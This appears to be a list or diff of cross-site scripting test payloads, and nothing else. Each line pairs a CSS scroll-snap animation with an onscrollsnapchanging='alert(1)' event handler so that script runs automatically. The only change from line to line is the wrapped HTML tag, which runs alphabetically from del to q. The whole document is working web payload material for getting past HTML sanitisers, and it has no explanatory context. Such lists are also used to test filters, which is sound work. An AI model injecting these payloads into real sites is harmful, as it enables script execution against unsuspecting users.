+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <del class="scroll-item">Item 1</del><del class="scroll-item">Item 2</del></del>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <details class="scroll-item">Item 1</details><details class="scroll-item">Item 2</details></details>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <dfn class="scroll-item">Item 1</dfn><dfn class="scroll-item">Item 2</dfn></dfn>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <dialog class="scroll-item">Item 1</dialog><dialog class="scroll-item">Item 2</dialog></dialog>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <dir class="scroll-item">Item 1</dir><dir class="scroll-item">Item 2</dir></dir>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <div class="scroll-item">Item 1</div><div class="scroll-item">Item 2</div></div>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <dl class="scroll-item">Item 1</dl><dl class="scroll-item">Item 2</dl></dl>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <dt class="scroll-item">Item 1</dt><dt class="scroll-item">Item 2</dt></dt>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <element class="scroll-item">Item 1</element><element class="scroll-item">Item 2</element></element>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <em class="scroll-item">Item 1</em><em class="scroll-item">Item 2</em></em>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <embed class="scroll-item">Item 1</embed><embed class="scroll-item">Item 2</embed></embed>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <fieldset class="scroll-item">Item 1</fieldset><fieldset class="scroll-item">Item 2</fieldset></fieldset>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <figcaption class="scroll-item">Item 1</figcaption><figcaption class="scroll-item">Item 2</figcaption></figcaption>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <figure class="scroll-item">Item 1</figure><figure class="scroll-item">Item 2</figure></figure>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <font class="scroll-item">Item 1</font><font class="scroll-item">Item 2</font></font>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <footer class="scroll-item">Item 1</footer><footer class="scroll-item">Item 2</footer></footer>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <form class="scroll-item">Item 1</form><form class="scroll-item">Item 2</form></form>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <frame class="scroll-item">Item 1</frame><frame class="scroll-item">Item 2</frame></frame>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <frameset class="scroll-item">Item 1</frameset><frameset class="scroll-item">Item 2</frameset></frameset>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <geolocation class="scroll-item">Item 1</geolocation><geolocation class="scroll-item">Item 2</geolocation></geolocation>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <h1 class="scroll-item">Item 1</h1><h1 class="scroll-item">Item 2</h1></h1>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <head class="scroll-item">Item 1</head><head class="scroll-item">Item 2</head></head>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <header class="scroll-item">Item 1</header><header class="scroll-item">Item 2</header></header>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <hgroup class="scroll-item">Item 1</hgroup><hgroup class="scroll-item">Item 2</hgroup></hgroup>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <hr class="scroll-item">Item 1</hr><hr class="scroll-item">Item 2</hr></hr>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <html class="scroll-item">Item 1</html><html class="scroll-item">Item 2</html></html>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <i class="scroll-item">Item 1</i><i class="scroll-item">Item 2</i></i>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <iframe class="scroll-item">Item 1</iframe><iframe class="scroll-item">Item 2</iframe></iframe>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <iframe2 class="scroll-item">Item 1</iframe2><iframe2 class="scroll-item">Item 2</iframe2></iframe2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <image class="scroll-item">Item 1</image><image class="scroll-item">Item 2</image></image>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <image2 class="scroll-item">Item 1</image2><image2 class="scroll-item">Item 2</image2></image2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <image3 class="scroll-item">Item 1</image3><image3 class="scroll-item">Item 2</image3></image3>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <img class="scroll-item">Item 1</img><img class="scroll-item">Item 2</img></img>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <img2 class="scroll-item">Item 1</img2><img2 class="scroll-item">Item 2</img2></img2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <input class="scroll-item">Item 1</input><input class="scroll-item">Item 2</input></input>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <input2 class="scroll-item">Item 1</input2><input2 class="scroll-item">Item 2</input2></input2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <input3 class="scroll-item">Item 1</input3><input3 class="scroll-item">Item 2</input3></input3>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <input4 class="scroll-item">Item 1</input4><input4 class="scroll-item">Item 2</input4></input4>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <ins class="scroll-item">Item 1</ins><ins class="scroll-item">Item 2</ins></ins>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <kbd class="scroll-item">Item 1</kbd><kbd class="scroll-item">Item 2</kbd></kbd>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <keygen class="scroll-item">Item 1</keygen><keygen class="scroll-item">Item 2</keygen></keygen>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <label class="scroll-item">Item 1</label><label class="scroll-item">Item 2</label></label>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <legend class="scroll-item">Item 1</legend><legend class="scroll-item">Item 2</legend></legend>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <li class="scroll-item">Item 1</li><li class="scroll-item">Item 2</li></li>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <link class="scroll-item">Item 1</link><link class="scroll-item">Item 2</link></link>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <listing class="scroll-item">Item 1</listing><listing class="scroll-item">Item 2</listing></listing>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <main class="scroll-item">Item 1</main><main class="scroll-item">Item 2</main></main>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <map class="scroll-item">Item 1</map><map class="scroll-item">Item 2</map></map>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <mark class="scroll-item">Item 1</mark><mark class="scroll-item">Item 2</mark></mark>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <marquee class="scroll-item">Item 1</marquee><marquee class="scroll-item">Item 2</marquee></marquee>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <menu class="scroll-item">Item 1</menu><menu class="scroll-item">Item 2</menu></menu>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <menuitem class="scroll-item">Item 1</menuitem><menuitem class="scroll-item">Item 2</menuitem></menuitem>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <meta class="scroll-item">Item 1</meta><meta class="scroll-item">Item 2</meta></meta>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <meter class="scroll-item">Item 1</meter><meter class="scroll-item">Item 2</meter></meter>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <multicol class="scroll-item">Item 1</multicol><multicol class="scroll-item">Item 2</multicol></multicol>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <nav class="scroll-item">Item 1</nav><nav class="scroll-item">Item 2</nav></nav>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <nextid class="scroll-item">Item 1</nextid><nextid class="scroll-item">Item 2</nextid></nextid>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <nobr class="scroll-item">Item 1</nobr><nobr class="scroll-item">Item 2</nobr></nobr>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <noembed class="scroll-item">Item 1</noembed><noembed class="scroll-item">Item 2</noembed></noembed>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <noframes class="scroll-item">Item 1</noframes><noframes class="scroll-item">Item 2</noframes></noframes>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <noscript class="scroll-item">Item 1</noscript><noscript class="scroll-item">Item 2</noscript></noscript>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <object class="scroll-item">Item 1</object><object class="scroll-item">Item 2</object></object>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <ol class="scroll-item">Item 1</ol><ol class="scroll-item">Item 2</ol></ol>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <optgroup class="scroll-item">Item 1</optgroup><optgroup class="scroll-item">Item 2</optgroup></optgroup>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <option class="scroll-item">Item 1</option><option class="scroll-item">Item 2</option></option>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <output class="scroll-item">Item 1</output><output class="scroll-item">Item 2</output></output>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <p class="scroll-item">Item 1</p><p class="scroll-item">Item 2</p></p>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <param class="scroll-item">Item 1</param><param class="scroll-item">Item 2</param></param>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <picture class="scroll-item">Item 1</picture><picture class="scroll-item">Item 2</picture></picture>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <plaintext class="scroll-item">Item 1</plaintext><plaintext class="scroll-item">Item 2</plaintext></plaintext>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <pre class="scroll-item">Item 1</pre><pre class="scroll-item">Item 2</pre></pre>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <progress class="scroll-item">Item 1</progress><progress class="scroll-item">Item 2</progress></progress>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <q class="scroll-item">Item 1</q><q class="scroll-item">Item 2</q></q>
